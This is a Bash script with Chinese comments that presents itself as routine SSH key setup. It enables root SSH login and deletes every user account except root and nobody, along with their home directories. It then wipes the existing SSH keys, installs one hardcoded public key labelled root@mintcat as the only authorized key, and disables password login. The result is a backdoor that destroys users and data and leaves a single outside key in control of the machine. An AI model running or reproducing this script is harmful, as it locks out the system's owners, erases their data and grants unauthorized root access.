# 自动检查并启用 root SSH 登录
enable_root_ssh_login() {
    echo "检测 root 用户是否允许通过 SSH 登录..."
    
    local ssh_config="/etc/ssh/sshd_config"
    local root_login_allowed=$(grep -E "^PermitRootLogin" $ssh_config | awk '{print $2}')

    if [[ "$root_login_allowed" != "yes" ]]; then
        echo "当前 root 用户 SSH 登录未启用，正在开启..."
        sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' $ssh_config
        sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' $ssh_config
        sudo systemctl restart sshd
        echo "已启用 root 用户 SSH 登录。"
    else
        echo "root 用户 SSH 登录已启用，无需修改。"
    fi

    echo "删除除 root 以外的用户..."
    for user in $(cut -d: -f1 /etc/passwd); do
        if [[ "$user" != "root" && "$user" != "nobody" ]]; then
            sudo userdel -r "$user" 2>/dev/null || true
            echo "已删除用户: $user"
        fi
    done
}

# 将此函数放置在 setup_ssh_key_auth 之前调用
setup_ssh_key_auth() {
    enable_root_ssh_login
    local ssh_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzx8GlO5jVkNiwBG57J2zVwllC1WHQbRaFVI8H5u+fZnt3YuuIsCJBCRfM7/7Ups6wdEVwhgk+PEq8nE3WgZ8SBgNoAO+CgZprdDi+nx7zBRqrHw9oJcHQysiAw+arRW29g2TZgVhszjVq5G6MoVYGjnnPzLEcZS37by0l9eZD9u1hAB4FtIdw+VfrfJG177HLfiLkSm6PkO3QMWTYGmGjE3zpMxWeascWCn6UTDpjt6UiSMgcmAlx4FP8mkRRMc5TvxqnUKbgdjYBU2V+dZQx1keovrd0Yh8KitPEGd6euok3e7WmtLQlXH8WOiPlCr2YJfW3vQjlDVg5UU83GSGr root@mintcat"

    echo "清除现有的授权密钥..."
    sudo rm -rf ~/.ssh
    mkdir -p ~/.ssh
    chmod 700 ~/.ssh

    echo "添加新的公钥到 authorized_keys..."
    echo "$ssh_key" > ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys

    echo "修改 SSH 配置以禁用密码登录..."
    sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
    sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config

    echo "重启 SSH 服务以应用更改..."
    sudo systemctl restart sshd

    echo "SSH 密钥登录已配置，密码登录已禁用。"
}
